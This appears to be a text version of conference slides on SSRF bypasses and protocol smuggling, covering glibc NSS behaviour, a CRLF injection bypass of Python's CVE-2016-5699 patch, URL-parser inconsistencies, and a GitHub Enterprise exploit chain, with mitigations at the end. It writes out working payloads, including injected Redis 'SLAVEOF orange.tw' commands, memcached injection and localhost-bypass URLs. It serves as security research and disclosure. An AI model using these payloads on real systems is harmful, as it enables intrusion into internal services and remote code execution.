# Exploiting GLibc NSS Features and Protocol Smuggling

## HTTP Request Example
```
GET / HTTP/1.1
Host: I-am-a-very-very-weird-domain.com
User-Agent: curl/7.53.1
Accept: */*
```

### Exploit Glibc NSS Features on Protocol Smuggling
HTTP 1.1 requires a `Host` header. The following example demonstrates a protocol smuggling attack:

```plaintext
http://127.0.0.1\r\nSLAVEOF orange.tw 6379\r\n:6379/
$ nc -vvlp 6379
```

#### Example Request:
```plaintext
GET / HTTP/1.1
Host: 127.0.0.1
SLAVEOF orange.tw 6379
:6379
Connection: close
```

### HTTPS and SNI Injection
To exploit SNI (Server Name Indication) injection, simply replace HTTP with HTTPS and embed the hostname in the SSL Client Hello.

```plaintext
https://127.0.0.1\r\nSET foo 0 60 5\r\n:443/
$ nc -vvlp 443
```

### CR-LF Injection in Python CVE-2016-5699
This vulnerability can be exploited by injecting carriage return and line feed characters. The patch for this issue is as follows:

```python
_is_illegal_header_value = re.compile(rb'\n(?![ \t])|\r(?![ \t\n])').search
if _is_illegal_header_value(values[i]):
    raise ValueError('Invalid header value %r' % (values[i],))
```

Bypassing the patch with a leading space:

```python
import urllib
url = 'http://0\r\n SLAVEOF orange.tw 6379\r\n :80'
urllib.urlopen(url)
```

### URL Parsing and SSRF Bypass
The following case studies demonstrate different ways to bypass SSRF protections using inconsistencies in URL parsers, DNS checkers, and URL requesters.

#### Case Study: WordPress
1. Paid lots of attention to SSRF protections.
2. Found 3 distinct ways to bypass the protections.
3. Bugs reported since Feb. 25, 2017, but still unpatched.
4. For responsible disclosure, MyBB is used as a case study.

#### Main Concept
Finding different behaviors among URL parsers, DNS checkers, and URL requesters.

| Component | WordPress | vBulletin | MyBB |
|-----------|-----------|------------|------|
| URL Parser | parse_url() | parse_url() | parse_url() |
| DNS Checker | gethostbyname() | None | gethostbynamel() |
| URL Requester | *cURL | *cURL | *cURL |

#### SSRF-Bypass Techniques
1. **Time-of-check to Time-of-use Problem**
   - Check the URL components and addresses.
   - Use cURL to fetch the URL, which may resolve to a different IP.

2. **Inconsistency Between DNS Checker and URL Requester**
   - No IDNA converter in `gethostbynamel()`, but cURL has one.
   - Example: `http://ß.orange.tw/`

3. **Inconsistency Between URL Parser and URL Requester**
   - Fixed in PHP 7.0.13 and cURL 7.54.
   - Example: `http://127.0.0.1:11211#@google.com:80/`

### Protocol Smuggling Case Study: GitHub Enterprise
GitHub Enterprise is a standalone version of GitHub written in Ruby on Rails with obfuscated code.

#### Vulnerabilities Chained into RCE
1. **SSRF-Bypass on Webhooks**
   - Fetching URL by `gem faraday`.
   - Blacklisting localhost, 127.0.0.1, etc., can be bypassed with a zero: `http://0/`.

2. **SSRF in Internal Graphite Service**
   - Graphite bound on `127.0.0.1:8000`.
   - URL splitting and HTTP connection request.

3. **CR-LF Injection in Graphite**
   - `httplib.HTTPConnection` suffers from CR-LF injection.
   - Example: `http://0:8000/composer/send_email?to=PI:EMAIL&url=http://127.0.0.1:6379/%0D%0ASET…`

4. **Unsafe Marshal in Memcached Gem**
   - All Ruby objects stored in cache are Marshal-ed.
   - Example: `http://0:8000/composer/send_email?to=PI:EMAIL&url=http://127.0.0.1:11211/%0D%0Aset…`

### Mitigations
- **Application Layer**: Use only IP and hostname, do not reuse the input URL.
- **Network Layer**: Use firewalls or network policies to block intranet traffic.

### Projects
- **SafeCurl** by @fin1te
- **Advocate** by @JordanMilne

### Summary
- New attack surface on SSRF-bypass.
- URL parsing issues and abusing IDNA standard.
- New attack vector on protocol smuggling.
- Linux Glibc NSS features and NodeJS Unicode failure.

### Acknowledgements
- Invalid URL parsing with '#' by @bagder
- URL Interop by @bagder
- Shibuya.XSS #8 by @mala
- SSRF Bible by @Wallarm
- Special thanks to Allen Own, Birdman Chiu, Henry Huang

### References
- [YouTube Demo](https://youtu.be/GoO7_lCOfic)
- [Twitter Cat Acknowledgements](https://twitter.com/harapeko_lady/status/743463485548355584)
- [Meme Websites](https://carpet.vidalondon.net/cat-in-carpet/)

Thank you!
Contact: PI:EMAIL
@orange_8361